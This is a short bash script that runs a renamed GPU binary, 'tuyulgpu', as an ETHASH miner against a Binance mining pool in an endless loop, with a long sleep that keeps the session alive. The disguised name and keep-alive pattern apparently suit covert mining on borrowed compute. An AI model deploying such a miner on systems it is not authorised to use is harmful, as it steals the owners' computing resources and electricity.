#!/bin/bash 
POOL=ethash.poolbinance.com:1800 
WORKER=RHYTHM 
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999
